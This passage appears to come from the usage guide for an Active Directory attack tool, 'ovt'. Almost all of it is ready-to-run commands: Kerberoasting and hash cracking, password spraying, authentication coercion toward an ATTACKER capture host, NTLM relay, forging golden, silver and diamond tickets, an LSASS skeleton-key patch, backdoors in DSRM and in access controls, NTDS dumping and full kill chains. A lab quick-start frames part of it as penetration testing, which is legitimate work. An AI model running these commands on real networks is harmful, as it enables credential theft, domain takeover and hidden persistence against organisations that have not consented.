ovt crack --hash-file ./loot/kerberoast_hashes.txt --wordlist rockyou.txt

# AS-REP Roasting
ovt kerberos asrep-roast -H DC -d DOMAIN -U ./loot/users.txt

# Bronze Bit (CVE-2020-17049)
ovt forge bronze-bit -d DOMAIN --user USER --domain-sid S-1-5-21-... --target-spn "cifs/TARGET"

# noPac (CVE-2021-42278/42287)
ovt forge no-pac -H DC -d DOMAIN -u USER -p PASS

# Password Spray (lockout-safe)
ovt spray -H DC -d DOMAIN --password 'Season2026!' --userlist ./loot/users.txt --delay 2000
```

### Coercion & Auth Triggering

```bash
# PrinterBug (MS-RPRN, CVE-2021-1678)
ovt ntlm trigger-printer-bug -H DC -d DOMAIN -u USER -p PASS --target TARGET --capture-ip ATTACKER

# PetitPotam (MS-EFSRPC, CVE-2021-42284)
ovt ntlm trigger-petitpotam -H DC -d DOMAIN -u USER -p PASS --target TARGET --capture-ip ATTACKER

# ShadowCoerce (WebDAV, CVE-2022-30154)
ovt ntlm relay -l 0.0.0.0:8080 -t ldap://TARGET --auto-coerce-targets TARGET
```

### Ticket Forging & Persistence

```bash
# Golden Ticket (full PAC construction)
ovt forge golden -d DOMAIN --krbtgt-hash <32hex> --user administrator --sid S-1-5-21-...

# Silver Ticket (service-specific)
ovt forge silver -d DOMAIN --service-hash <32hex> --user administrator --spn "cifs/TARGET"

# Diamond Ticket (PAC modification, preserves KDC checksum)
ovt forge diamond -d DOMAIN --user USER --domain-sid S-1-5-21-... --tgt ./tgt.kirbi

# Shadow Credentials
ovt shadow attack -H DC -d DOMAIN -u USER -p PASS --target "target-user"

# Skeleton Key (native DLL, patch LSASS)
ovt forge skeleton -H DC -d DOMAIN -u ADMIN -p PASS --payload-path ./skeleton_key.dll

# DSRM Backdoor
ovt forge dsrm-backdoor -d DOMAIN --domain-sid S-1-5-21-... --krbtgt-hash <32hex>

# ACL Backdoor (DACL modification)
ovt forge acl-backdoor -d DOMAIN --target-dn "CN=Admin,CN=Users,DC=DOMAIN,DC=local" --trustee-dn "CN=USER,CN=Users,DC=DOMAIN,DC=local"
```

### Zero-Knowledge Kill Chain (No Creds)

```bash
# Step 1: Pre-auth discovery
ovt enum pre -H DC -d DOMAIN

# Step 2: Zero-knowledge user enumeration via Kerberos
ovt kerberos user-enum -H DC -d DOMAIN --userlist /usr/share/seclists/Usernames/Names/names.txt

# Step 3: Check for no-preauth accounts
ovt kerberos asrep-roast -H DC -d DOMAIN -U ./loot/users.txt

# Step 4: Spray common passwords (lockout-safe)
for pw in 'Season2026!' 'Winter2026!' 'Password123!'; do
  ovt spray -H DC -d DOMAIN --password "$pw" --userlist ./loot/users.txt --delay 3000
done
```

### Full PWN (Assumes vagrant:vagrant)

```bash
# 1. Full domain enumeration
ovt enum all -H DC -d DOMAIN -u vagrant -p vagrant
ovt adcs auto -H DC -d DOMAIN -u vagrant -p vagrant

# 2. Kerberoast + crack
ovt kerberos roast -H DC -d DOMAIN -u vagrant -p vagrant
ovt crack --hash-file ./loot/kerberoast_hashes.txt --wordlist rockyou.txt

# 3. ADCS exploit via dispatcher
ovt forge adcs --ca-server "CA\NAME" --domain DOMAIN -u vagrant -p vagrant

# 4. Lateral movement
ovt exec -t DC -c "whoami" -d DOMAIN -u vagrant -p vagrant

# 5. Credential dump (VSS shadow copy if DRSUAPI unavailable)
ovt dump DC ntds-vss -d DOMAIN -u vagrant -p vagrant

# 6. Persist
ovt forge golden -d DOMAIN --krbtgt-hash <hash> --user administrator --sid S-1-5-21-<sid>

# 7. Report
ovt report --format pdf --output engagement-report.pdf
```

---

## Quick Reference Card

```bash
# === RECON ===
ovt scan --targets DC                                  # No-creds port/null-session triage
ovt enum pre -H DC                                     # No-creds AD service triage
ovt enum anonymous -H DC                               # Anonymous LDAP RootDSE probe
ovt enum null-session -H DC                            # Null-session RID range probe
ovt enum all -H DC -d DOMAIN -u USER -p PASS           # Enumerate everything
ovt reaper -H DC -d DOMAIN -u USER -p PASS             # Full LDAP reaper
ovt rid -H DC --null-session                           # RID cycling no-creds

# === KERBEROS ===
ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS     # Kerberoast
ovt kerberos asrep-roast -H DC -d DOMAIN -u USER       # AS-REP Roast
ovt kerberos get-tgt -H DC -d DOMAIN -u USER -p PASS   # Get TGT
ovt kerberos user-enum -H DC -d DOMAIN                 # Zero-knowledge user enum
ovt crack --file hashes.txt --mode thorough            # Crack offline

# === CERTS ===
ovt adcs enum -H DC -d DOMAIN -u USER -p PASS          # Find vulnerable templates
ovt adcs esc1 --ca CA --template TPL --target-user DA   # ESC1 exploit

# === LATERAL ===
ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN       # Remote exec
ovt shell -t TARGET -d DOMAIN -u ADMIN -p PASS          # Interactive shell
ovt smb admin --targets 10.10.10.0/24                   # Admin check

# === LOOT ===
ovt dump -t DC ntds -d DOMAIN -u DA -p PASS             # Dump NTDS
ovt forge golden --krbtgt-hash HASH --domain-sid SID    # Golden ticket
ovt laps -H DC -d DOMAIN -u USER -p PASS                # Read LAPS

# === ACL & GPO ABUSE ===
ovt acl force-password -t jdoe -p 'NewPass!'            # Force password change
ovt acl add-member -g "CN=Domain Admins,..." -m "CN=..." # Add to group
ovt gpo write -g "Default Policy" --sysvol <path> -c cmd # GPO ImmediateTask

# === AZURE / ENTRA ===
ovt azure enum -H DC -d DOMAIN -u USER -p PASS          # Hybrid identity enum
ovt azure golden-saml -H DC -d DOMAIN -u USER -p PASS   # Golden SAML forge

# === AUTOPWN ===
ovt wizard -t DA --dc-host DC -d DOMAIN -u USER          # Guided mode

# === NTLM RELAY ===
ovt ntlm capture --interface eth0                        # Capture hashes
ovt ntlm relay --targets TARGET:445                      # Relay to target

# === MISC ===
ovt doctor                                                # Health check
ovt report -o report.pdf --format pdf                     # Generate report
ovt tui --domain DOMAIN                                   # Launch TUI
ovt module run zerologon -t DC                            # Zerologon check
```

---

## VulnAD Quick-Start

For the VulnAD lab environment.

```
Kali (attacker)        : 192.168.6.20
WS2025 DC (dc01)       : 192.168.6.10
WS2025 Member (ws01)   : 192.168.5.145
```

### Pre-configured

A TOML config ships at `configs/vulnad.toml`:

```bash
ovt wizard --config configs/vulnad.toml
```

### Manual commands

```bash
# Phase 1: Recon (no creds needed first)
ovt enum pre -H 192.168.6.10
ovt enum anonymous -H 192.168.6.10

# Phase 2: Full enumeration (with creds)
ovt enum all -H 192.168.6.10 -d vulnad.local -u <user> -p '<pass>'

# Phase 3: Kerberoast
ovt kerberos roast -H 192.168.6.10 -d vulnad.local -u <user> -p '<pass>'

# Phase 4: Crack hashes
ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough

# Phase 5: Lateral to member server
ovt exec -t 192.168.5.145 -c "whoami /all" -d vulnad.local -u <user> -p '<pass>'

# Phase 6: DCSync (if you got DA)
ovt dump -t 192.168.6.10 ntds -d vulnad.local -u <da_user> -p '<da_pass>'

# Phase 7: Report
ovt report --format pdf --output vulnad-report.pdf
```